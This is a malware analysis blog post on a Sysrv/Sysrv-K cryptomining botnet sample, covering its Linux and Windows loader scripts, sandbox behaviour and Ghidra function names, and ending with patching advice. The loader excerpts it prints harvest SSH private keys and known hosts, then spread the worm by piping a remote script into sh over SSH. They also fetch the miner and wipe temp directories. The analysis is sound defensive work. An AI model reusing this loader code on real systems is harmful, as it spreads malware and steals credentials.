Recently, I've investigated a couple of coin mining cases which stood out a little differently to the usual ones I see. For one, the miner had been deleted and no config was present on disk. In one instance, a suspicious _cronjob_ was removed and the suspicious random named process killed. However, things kept on reoccuring after reboots. Add to this a raft of suspicious network connections from these random processes, SSH inbound/outbound and a couple of connections to one IP in particular using ports 80/8080 suggests a bit more tradecraft at work here.

> The focus of this post takes a little look at Sysrv and the likely connections, before diving into the coin miner and related activity from a Linux perspective.

# Sysrv / Sysrv-K - A very quick intro

Sysrv is a botnet written in Golang (Go), with worm capabilities that drops XMRig crypto miner onto vulnerable hosts (both Linux and Windows). Iterations have taken advantage of weak passwords and variety of vulnerabilities for different services, including but not limited to: _MySQL, Tomcat, Jenkins, WebLogic and WordPress plugins_. 

The botnet was first identified back in December 2020 [^1], with a good deep dive by Cujo AI published in September 2021 [^2]. More recently in May 2022 (I know, over a year ago!), Microsoft published ~~a Tweet~~ what is now an 'X' highlighting a new variant that they dubbed Sysrv-K [^3]. The updated variant discussed by Microsoft points out that Sysrv continue to update the worm with additional, newer exploits on top of the old ones and added a Telegram bot capability.

I haven't come across any newer blog posts on the subject of Sysrv(-K) that offer an update on capabilities, hence this post (if you read this and know of any other blogs or research on the topic reach out!).

> I should say it could just be that another actor is utilising the Sysrv binaries for their own ends, similar to what has been witnessed with other botnets such as Tsunami.

# Technical Analysis 

As highlighted at the beginning of this post, focus will be on the Linux binary for analysis. However, the loader script for Windows has also been provided.

## Loader Scripts

The loader scripts have not changed much over the years. They utilise the same names _ldr.sh_ / _ldr.ps1_ as previous variants, and generally contain the same format and functionality.

![ldr.sh](/assets/img/sysrv/ldr_sh.jpg)

Some key points in the snippet above:

- Payload IP is hardcoded
- Generate a unique ID (used later to name the binary download)
- Attempts to disable / create basic Firewall rules
- Defence evasion
- Search for other miner like cron jobs, mounts and processes to be killed

The script checks to see if there is already an instance of _kthreaddk_ running; before requesting the payload if it isn't. Once downloaded, the binary is run with `nohup` and any output suppressed. Clean up is performed after this step of */tmp* directories and the payload binary.

```bash
ps -ef | grep -v bash | grep kthreaddk | grep -v grep
if [ $? -ne 0 ]; then
  PATH=".:$PATH"
  get $cc/sys.$(uname -m) $sys
  nohup $sys 1>/dev/null 2>&1 &
  sleep 1
fi
rm -rf /var/tmp/* /var/tmp/.* /tmp/* /tmp/.* $sys dlr
```

There is also a section to gather user, host and SSH key data which the script will then use to try and propagate itself to additional hosts.

```bash
_sig="$HOME/.localssh"
if [ ! -f $_sig ]; then
touch $_sig
KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*'|grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F "IdentityFile" '{print $2 }')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem'|uniq)
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history|grep -E "(ssh|scp)"|grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts|grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"|uniq)
USERZ=$(
    echo root
    find ~/ /root /home -maxdepth 2 -name '\.ssh'|uniq|xargs find|awk '/id_rsa/'|awk -F'/' '{print $3}'|uniq|grep -v "\.ssh"
)
users=$(echo $USERZ|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
hosts=$(echo "$HOSTS $HOSTS2 $HOSTS3"|grep -vw 127.0.0.1|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
keys=$(echo "$KEYS $KEYS2 $KEYS3"|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
for user in $users; do
    for host in $hosts; do
        for key in $keys; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "(curl $cc/ldr.sh||wget -O- $cc/ldr.sh)|sh"
        done
    done
done
fi
```

Additional items to note:

- Disable / Remove AV & management agents
  - Aliyun 
  - BCM 
  - Tencent
- Other clean up
  - mail/root
  - wtmp
  - secure
  - cron

![ldr.ps1](/assets/img/sysrv/ldr_ps1.jpg)

Similar to the Linux loader, the Windows version has the following:

- Payload IP hardcoded
- Generates a unique ID (used later to name the binary download)
  - Different on every run as it uses `date`
- Hardcoded path for the payload
- Disables firewall
- Search for other miner like processes to be killed
- Persistence
  - Scheduled Task
  - Registry 'Run' key

_The loader scripts can be found on on my GitHub repo [here](https://github.com/Pir00t/maybe_sysrv)_

## sys.x86_64

The sample analysed is a UPX packed, 64-bit ELF binary and can be found on VirusTotal:

[Packed](https://www.virustotal.com/gui/file/847d80d87549a0e3995816ad60c82464bb9d8823013beb832f5b31a2e4ef0445/details)  
[Unpacked](https://www.virustotal.com/gui/file/9d9150e2def883bdaa588b47cf5300934ef952bea3acd5ad0e86e1deaa7d89c5/details)

Both were first submitted back in January 2023, and have had recent submissions over the last couple of months. A couple of things to point out here:  
- Unpacked = 12.5MB! 
- Submission names are "mostly" randomised (6 alphanumeric characters in length as per the loader script)

Given the size of the file and due to time constraints, I started with some dynamic analysis on this one to understand the behaviours I'd established during my forensics investigation. For reference, the main behaviour spotted was:

- Spawned kthreaddk (file deleted but data in /proc)
- Crontab entry pointing to the payload to run every minute
- Network activity
  - Inbound/Outbound SSH connections so suspicious IP's
  - kthreaddk connecting back to the payload IP on port 8080

Given the details established in the loader script it can be presumed that _kthreaddk_ is a coin miner.

### Dynamic Analysis

Having a starting point, I setup my Linux VM to accomplish the following before detonating the binary:

- Run Wireshark
- Monitor
  - crontab
  - netstat
  - top

#### Initial Run

What I immediately noticed in the `top` output was an instance of _kthreaddk_ being spawned...and then stopped just as quick. There was no Wireshark traffic though netstat did update to show a the *sys.x86_64* binary listening for tcp6 activity. 

Also of interest was a new crontab entry...but not for long:

```bash
* * * * * /home/remnux/.cache/mozilla/firefox/b5quf9ce.default-release/settings/302blc
```

**Persistent aren't we**

While taking a moment to remember I had no external network or simulation enabled in my VM, I noticed the crontab entry change its path. Intrigued, I kept an eye on it and again, it changed. Turns out every 60 seconds, the cronjob would be rewritten to provide a new path and the file in the previous path would also be (re)moved. With the timing down, I managed to take a copy of the binary referenced in the crontab upon a refresh, which upon taking its checksum was a copy of *sys.x86_64*.

For those interested, I utilised the following command to monitor for crontab changes:

```bash
watch -n 10 crontab -l
```

#### Take Two

This time I ran the binary via a network connected sandbox and...

Success! The coin miner stayed running and `Wireshark` sprung to life, attempting to send (mostly) SYN packets to a number of IP addresses targeting various ports. I'll provide the unique IP/PORT combos on my repo [here](https://github.com/Pir00t/maybe_sysrv/blob/main/ip_port_stats.txt).

**Pulling that kthreaddk**

Now that I had _kthreaddk_ in my sights, I just had to catch it! I setup a `watch` for new files being created anywhere in _/home/user_ and noticed on each fresh run that the binary would get dropped to a random path along with _config.json_. However, by the time I browsed to these paths the files were gone! I tried some tools such as `inotify` for file creation monitoring to then copy the file with no success. I also attempted using `auditd` and a Python script to perform a similar monitor/copy function to no avail. 

So, what now... well my trusty `watch` commands have proved fruitful so far. So I crafted another one to utilise `find` for new files and copy anything to a "safe" directory:

```bash
watch -n 1 find ~ -type f -name \"*[^.]*\" -mmin 0.25 -exec cp -t working/output {} +
```

Finally, a bite. I managed to grab the coin miner and its config before they were deleted! Here is the VirusTotal [link](https://www.virustotal.com/gui/file/0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) for the miner.

Reviewing _config.json_ adds weight to the Sysrv link with the miner looking to proxy traffic back via the payload URL on port 8080 as outlined as _"Case 5"_ in the Cujo deep dive blog[^2].

### Static Analysis (Ghidra)

I won't be doing a deep dive here as that could take another post (or two!), but I'll touch on a few functions I reviewed that validated the behaviour seen in my dynamic analysis.

#### Prerequisites

There are a few steps required to start static analysis:

- Unpack using _upx -d file_
- Some good Ghidra scripts to parse the unpacked Go binary [^4] [^5]

> There are some new Golang features in the latest Ghidra but I'd already done my analysis by this point so can't comment how useful they may have been

A quick check of the binary with `checksec` shows that it unlikely uses ASLR so any function addresses should be persistent for analysis. 

#### Functions Recovered

Having recovered function names with Ghidra scripts, the main function is established:

- main.main @ 00703b30

As seen in the Cujo blog and another older post by Juniper Networks [^6], a large portion of key functions start with shell like so:

- shell/exploit.*
- shell/miner.*
- shell/nu.*
- shell/scanner.*

Unlike previous writeups however, CVE name/numbers have mostly been removed or likely obfuscated. Though from the naming that can be seen, there is a few related to **WordPress** - a full list of shell functions can be found [here](https://github.com/Pir00t/maybe_sysrv/blob/main/sys_x86_64_funcs.txt).

#### Validate Dynamic Analysis

Thankfully some functions have useful names and help with the validation theory, such as:

- shell/miner.findWritableDir
- shell/miner.findWritableDir.func1
- shell/miner.findWritableDir.func2
- shell/scanner.(*Scanner).Scan
- shell/scanner.(*Scanner).sendSynPkt

While not a full process flow from **main.main** the following highlights loosely some functions that are used and linked to the behaviour witnessed:

```main.main > shell/exploit.Run > shell/exploit.(*__40ad2).Run```

Within **shell/exploit.(*__40ad2).Run** is where things kick off a bit; with a new scanner setup, the coin miner started and a heartbeat as referenced in the screenshot below:

![exploit_fun](/assets/img/sysrv/exploit_ghidra.png)

The function also helps give an insight into the use of Go besides the fact it can be cross platform. The calls to `runtime.newproc` are responsible for allocating a new stack for a goroutine. 

> In Go, each goroutine has its own stack space. When a new goroutine is created, a new stack is allocated to it to provide a separate execution context. This allows goroutines to execute concurrently without interfering with each other's memory.

I'll stop here for this post as there is a bit to take in. Overall, I feel that there were enough similarities in loaders, code and functionality compared to other published analysis to tag this with Sysrv / Sysrv-K.

If the appetite is there, I would consider diving a bit deeper into the binary itself, but for now I don't have any spare threads myself to do so!

# Recommendations

**PATCH, PATCH, PATCH**; So many of these worms/coin miner families can be avoided by patching systems. On top of that, a good asset inventory and regular scanning of your public IP ranges will help. So often it's a rogue one (and no I don't mean Star Wars) that gets popped.
